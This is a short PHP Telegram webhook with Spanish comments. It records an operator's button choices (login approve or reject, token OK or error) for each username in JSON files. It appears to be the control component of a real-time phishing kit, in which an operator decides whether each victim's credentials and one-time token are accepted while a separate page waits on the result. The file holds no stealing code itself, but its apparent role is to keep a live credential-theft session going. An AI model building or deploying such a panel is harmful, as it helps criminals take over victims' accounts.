<?php
include("settings.php");

// Verificar que el request viene de Telegram
$secret_header = $_SERVER['HTTP_X_TELEGRAM_BOT_API_SECRET_TOKEN'] ?? '';
if ($secret_header !== $webhook_secret) {
    http_response_code(403);
    exit('Forbidden');
}

$update = json_decode(file_get_contents('php://input'), true);

if (isset($update['callback_query'])) {
    $cb    = $update['callback_query'];
    $cb_id = $cb['id'];
    $data  = $cb['data']; // Formato: "ACCION|usuario"

    $parts   = explode('|', $data, 2);
    $action  = $parts[0] ?? '';
    $usuario = $parts[1] ?? '';

    if (!file_exists('data')) mkdir('data', 0755, true);

    // Determinar tipo: login o token
    $tipo = in_array($action, ['TOKOK', 'TOKERR']) ? 'tok' : 'login';

    file_put_contents(
        "data/" . md5($usuario) . "_{$tipo}.json",
        json_encode(['action' => $action, 'usuario' => $usuario, 'time' => time()])
    );

    // Responder al callback (requerido por Telegram para quitar el spinner)
    file_get_contents("https://api.telegram.org/bot{$token}/answerCallbackQuery?" . http_build_query([
        'callback_query_id' => $cb_id,
        'text'              => "✅ $action → $usuario"
    ]));
}

http_response_code(200);
echo 'OK';
